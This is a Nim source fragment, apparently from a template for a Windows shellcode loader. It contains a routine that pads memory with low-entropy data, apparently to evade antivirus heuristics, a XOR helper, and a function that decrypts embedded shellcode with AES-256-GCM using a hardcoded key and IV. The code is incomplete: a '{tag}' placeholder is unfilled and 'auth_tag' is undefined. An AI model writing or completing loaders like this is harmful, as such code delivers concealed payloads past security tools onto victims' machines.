import winim
import times
import os
import nimcrypto
import nimcrypto/[rijndael, bcmode]

proc entropyDilution*() =
  var buf = newSeq[uint8](64 * 1024) # 64 KB de données à faible entropie

  # Pattern déterministe et répétitif
  for i in 0 ..< buf.len:
    buf[i] = uint8((i * 7) mod 256)

  # Forcer l'utilisation réelle du buffer
  var checksum: uint32 = 0
  for b in buf:
    checksum = (checksum shl 1) xor uint32(b)

  # Empêche l'optimisation agressive
  if checksum == 0xFFFFFFFF'u32:
    echo "impossible"
    
proc xor_tab(tab: array[322,byte]): array[322,byte] =
    var copy: array[322,byte] = tab
    for i in 0 ..< tab.len:
        copy[i] = tab[i] xor 0x41
    return copy


proc initial_vector():array[12, byte] =
  var iv: array[12, byte]
  for i in 0..<12:
    iv[i] = byte(i * 3)

  return iv

proc generate_key():array[32, byte]=
  var key: array[32, byte]
  for i in 0..<32:
    key[i] = byte(i + 10)

  return key
  


proc decode_shellcode(shellcode_enc: seq[byte]): seq[byte] =
  # Initialiser IV et clé
  {tag}
  var iv: array[12, byte] = initial_vector()
  var key: array[32, byte] = generate_key()


  var shellcode_decrypted = newSeq[byte](shellcode_enc.len)
  
  # Déchiffrer
  var ctx: GCM[aes256]
  ctx.init(key, iv, @[])  
  ctx.decrypt(shellcode_enc, shellcode_decrypted)
  
  var verifyTag: array[16, byte]
  ctx.getTag(verifyTag)
  ctx.clear()
  
  if auth_tag == verifyTag:
    echo "Tag vérifié : message authentique"
  else:
    echo "Erreur : message modifié ou corrompu"
    quit(1)  
  
  return shellcode_decrypted